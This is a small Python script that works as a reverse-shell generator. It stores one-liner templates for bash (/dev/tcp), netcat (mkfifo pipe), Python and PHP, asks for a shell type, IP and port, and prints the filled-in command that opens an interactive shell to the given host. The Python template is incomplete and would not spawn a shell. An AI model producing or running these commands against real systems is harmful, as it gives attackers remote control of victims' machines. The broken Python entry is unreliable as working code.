shells = {
	"bash" : "bash -i >& /dev/tcp/{}/{} 0>&1",
	"nc" : "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f",
	"netcat" : "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f",
	"python" : "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}))",
	"php" : "php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
}


shell = input("Type of reverse shell:").lower()
ip = input("IP:")
port = input("Port:")

print(shells[shell].format(ip,port))